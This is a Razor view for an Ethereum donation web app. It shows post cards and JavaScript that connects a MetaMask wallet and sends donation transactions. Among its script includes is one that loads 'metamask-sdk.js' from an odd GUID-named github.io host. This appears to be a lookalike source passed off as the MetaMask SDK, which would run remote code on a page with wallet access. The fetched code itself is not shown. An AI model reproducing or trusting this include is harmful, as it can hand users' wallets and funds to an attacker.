@model IEnumerable<donatETH.Models.Post>



<div class="cards-table">
    @foreach (var item in Model)
    {
        <a href="@Url.Action("Create", "Posts")" style="text-decoration:none; color: inherit;">
        <div class="card"> 
            <div style="width: 100%; height:50%; border-top-left-radius: 30px; border-top-right-radius: 30px; display: flex; align-items: top; justify-content: center; background-image: url('@item.ImageUrl'); background-size: cover; background-position: center; background-repeat: no-repeat;">
            </div>
            <div class="card-body">
                    <progress value="@item.CurrentSum" max="@item.Goal"></progress>
                    <span class="card-text">@item.Title</span>
                    <span class="card-price">@item.Price</span>
                    @*<button onClick="donate(@item.Index, '@item.Creator', @item.Price)">Donate</button>*@
                </div>
        </div>
        </a>
    }
</div>

<script>
    function SaveLike (index, id)
    {
        if(localStorage.getItem("likedpost_"+id)==null){
            localStorage.setItem("likedpost_"+id, 1)
        }
        else if(localStorage.getItem("likedpost_"+id)==1){
            localStorage.setItem("likedpost_"+id, 0)
        }
        else if(localStorage.getItem("likedpost_"+id)==0){
            localStorage.setItem("likedpost_"+id, 1)
        }
        $.ajax({
            url: '/Posts/Like',
            type: 'POST',
            data: { index: index, liked: localStorage.getItem("likedpost_"+id) },
            success: function (result) {}
            });
    }
</script>

@*  <button onClick="SaveLike(@item.Index, @item.Id)">Like</button>*@
@*                </td>
    <td>*@

<script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
<script src="https://cdn.jsdelivr.net/npm/web3@1.3.6/dist/web3.min.js"></script>

<script>
    let accounts = {};
       async function connectWallet(){
           if(Object.keys(accounts).length == 0) {
               accounts = await window.ethereum.request({ method: "eth_requestAccounts" }).catch((err) => {
             //TODO
            console.log(err.code);
            })
            console.log(accounts)
           }

       }

       async function donate (index, creator, price)
       {
           if(Object.keys(accounts).length == 0) {
               await connectWallet()
               console.log(accounts[0])

           }
           const web3 = new Web3(window.ethereum)
           const priceInWei = web3.utils.toWei(price.toString(), "gwei")
            await ethereum.request({ method: 'eth_sendTransaction', params: [{
                "from": accounts[0],
                "to": creator,
                "gas": Number(21000).toString(16),
                "gasPrice": Number(2500000).toString(16),
                "value": web3.utils.toHex(priceInWei),
            }]
            }).catch((err)=>{
                //TODO
                console.log(err.code)
            })
            $.ajax({
            url: '/Posts/Donate',
            type: 'POST',
            data: { index: index },
            success: function (result) {}
            });

       }
</script>

@*
    </td>


    </tr>
    }
    </tbody>
    </table>*@



